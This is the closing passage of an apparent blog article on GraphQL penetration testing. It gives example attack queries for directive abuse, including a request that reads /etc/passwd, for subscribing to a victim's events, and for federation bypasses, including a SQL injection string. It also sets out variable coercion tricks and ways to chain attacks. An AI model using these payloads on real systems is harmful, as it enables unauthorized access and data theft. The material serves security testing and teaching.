approaches:</p>\n<ol>\n<li>\n<p><strong>Query fingerprinting evasion</strong>:</p>\n<ul>\n<li>Modify query structure while preserving functionality</li>\n<li>Use aliases to rename operations</li>\n<li>Add/remove whitespace and comments</li>\n<li>Split complex queries into simpler ones</li>\n</ul>\n</li>\n<li>\n<p><strong>Persisted query exploitation</strong>:</p>\n<ul>\n<li>Look for hash-based persisted query implementations</li>\n<li>Try hash collision attacks</li>\n<li>Test for hash bypass techniques</li>\n<li>Use timing attacks to discover valid hashes</li>\n</ul>\n</li>\n<li>\n<p><strong>GraphQL directive abuse</strong>:</p>\n<ul>\n<li>Test for insecure custom directives</li>\n<li>Try using internal directives in unexpected contexts</li>\n<li>Look for directive-based authorization bypasses</li>\n</ul>\n<p>Examples:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\"># 1. Using @skip or @include to bypass access controls\nquery {\n  sensitiveData @skip(if: false) {\n    internalFields\n  }\n  # Some implementations check auth at the query level but not for skipped fields\n}\n\n# 2. Exploiting real-world custom directives\nquery {\n  user(id: \"admin\") {\n    # Apollo federation exposes _entities queries that might bypass auth\n    _entities(representations: [{__typename: \"User\", id: \"admin\"}]) {\n      ... on User {\n        email\n        role\n      }\n    }\n  }\n}\n\n# 3. Directive parameter injection in implementations using dynamic resolvers\nquery {\n  documents {\n    content @transform(expression: \"file:///etc/passwd\")\n  }\n}\n\n# 4. Auth context leakage through directives\nquery {\n  public {\n    data @authenticate\n    # In some implementations, @authenticate may store auth context in a way\n    # that affects subsequent field resolution\n  }\n}\n</code></pre>\n<p>In the wild, directive vulnerabilities have been found in:</p>\n<ul>\n<li>Custom GraphQL servers that implement dynamic expression evaluation</li>\n<li>APIs that use directives for formatting/transformation but fail to sanitize inputs</li>\n<li>Implementations where directive execution happens before field-level authorization</li>\n<li>Federation setups where directives are implemented inconsistently across services</li>\n</ul>\n</li>\n<li>\n<p><strong>Subscription vulnerabilities</strong>:</p>\n<ul>\n<li>Test for unbounded subscriptions</li>\n<li>Check for missing authentication on subscription operations</li>\n<li>Try to subscribe to other users' events</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">subscription {\n  userUpdates(userId: \"victim_id\") {\n    email\n    activity\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>Federation vulnerabilities</strong>:</p>\n<ul>\n<li>Test for inconsistent authorization between federated services</li>\n<li>Check for information leakage in subgraph responses</li>\n<li>Exploit entity resolution misconfigurations</li>\n</ul>\n<p>Real-world examples:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\"># 1. Exploiting inconsistent auth in a microservices architecture\n# A real case where User service required JWT but Products service only checked\n# if any JWT was present without validating user permissions\nquery ProductLeakage {\n  product(id: \"classified-product-1337\") {\n    name\n    price\n    internalManufacturingCost  # Should be admin-only field\n  }\n}\n\n# 2. Entity resolution bypass found in production\n# Gateway expected ID to be a UUID but subgraph accepted string format too\nquery EntityResolutionBypass {\n  node(id: \"user-1 UNION SELECT * FROM admin_users--\") {\n    ... on User {\n      username\n      email\n    }\n  }\n}\n\n# 3. Documented gateway bypass in a financial company\n# Sending to https://payments.internal-api.company.com:8443/graphql\n# instead of https://api.company.com/graphql bypassed IP restrictions\nquery DirectSubgraphAccess {\n  processCreditCard(input: {\n    cardNumber: \"4111111111111111\",\n    cvv: \"123\"\n  }) {\n    success\n  }\n}\n\n# 4. Observed type extension confusion vulnerability\nquery TypeExtensionConfusion {\n  product(id: \"1\") {\n    name\n    # Product type was defined in main subgraph with proper auth\n    \n    reviews {\n      # Reviews subgraph extended Product but implemented different\n      # auth checks, leading to leak of embargoed reviews\n      embargoed\n      unreleased\n    }\n  }\n}\n</code></pre>\n<p>Federation vulnerabilities discovered in production often involve:</p>\n<ul>\n<li>Authentication verification occuring at gateway but authorization in subgraphs</li>\n<li>JWT validation differences between gateway and subgraphs</li>\n<li>Direct subgraph exposure (services accessible directly, bypassing gateway)</li>\n<li>Entity key validation differences (UUID vs string vs int)</li>\n</ul>\n</li>\n<li>\n<p><strong>Variable coercion attacks</strong>:</p>\n<ul>\n<li>Exploit type conversion in GraphQL by providing unexpected types</li>\n<li>Test Boolean/String/Int conversions for logic bypasses</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query ($isAdmin: Boolean!) {\n  userInfo(includePrivate: $isAdmin) {\n    email\n    ssn\n    salary\n  }\n}\n</code></pre>\n<p>Send with variables: <code>{\"isAdmin\": \"true\"}</code> instead of <code>{\"isAdmin\": true}</code></p>\n</li>\n</ol>\n<h3>10. Real-World Attack Chaining</h3>\n<p>The most devastating GraphQL attacks chain multiple vulnerabilities:</p>\n<ol>\n<li>\n<p><strong>Introspection to data leak to account takeover</strong>:</p>\n<ul>\n<li>Map the API with introspection</li>\n<li>Find and exploit an injection vulnerability</li>\n<li>Extract sensitive data or authentication material</li>\n<li>Use this to elevate privileges or take over accounts</li>\n</ul>\n</li>\n<li>\n<p><strong>DoS to injection to privilege escalation</strong>:</p>\n<ul>\n<li>Create DoS conditions to trigger error states</li>\n<li>Use error messages to gather information</li>\n<li>Leverage timing attacks during DoS to extract data</li>\n<li>Use extracted data to gain higher privileges</li>\n</ul>\n</li>\n<li>\n<p><strong>Batching + injection + CSRF</strong>:</p>\n<ul>\n<li>Use batching to bypass rate limits</li>\n<li>Chain with injection to extract CSRF tokens</li>\n<li>Create CSRF exploits using the extracted tokens</li>\n<li>Bundle everything in a deliverable attack package</li>\n</ul>\n</li>\n</ol>\n<p>Document your attack chains carefully - they're often the most convincing demonstrations of impact.</p>\n<h2>Conclusion</h2>\n<p>GraphQL gives security testers a massive attack surface to work with. The same features that make it attractive to developers create openings for us to exploit. From conducting initial reconnaissance through introspection, to injecting malicious queries, to performing nested query DoS attacks - GraphQL offers many paths to compromise.</p>\n<p>Remember that most GraphQL deployments are still immature from a security perspective. Developers are focused on functionality first, with security as an afterthought. This means you'll often find multiple vulnerabilities in a single API that can be chained together for maximum impact.</p>\n<p>The most effective attack strategies combine multiple techniques. Start with introspection to map the API, use injection techniques to extract sensitive data, leverage batching to bypass rate limits, and if all else fails, hit them with resource-intensive queries to impact availability.</p>\n<p>When testing GraphQL APIs, always look beyond the obvious. That email field might expose more than just the address if you inject the right payload. That simple query might return admin data if you bypass object-level checks. That innocent-looking mutation might affect more than what's documented.</p>\n<p>The best part about attacking GraphQL is that many traditional protections don't apply. WAFs often struggle with GraphQL's flexible format. Authentication schemes that work for REST often break down with GraphQL's single endpoint model. And many GraphQL servers still have introspection enabled in production, essentially handing you the keys to the kingdom.</p>\n<p>Whether it's API mapping, data exfiltration, or full account takeover, GraphQL offers plenty of opportunities for creative attacks. Use the techniques in this article to thoroughly test GraphQL implementations and demonstrate real impact to your clients or organization.</p>\n<p>Happy hacking!</p>\n<hr>\n<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>\n","excerpt":"GraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by lettin...","title":"GraphQL PenTest Methodology and Exploitation Techniques","date":"2023-03-18","tags":["Web Security","GraphQL","Penetration Testing","API Security","Vulnerability Research","Exploitation"]}},"__N_SSG":true}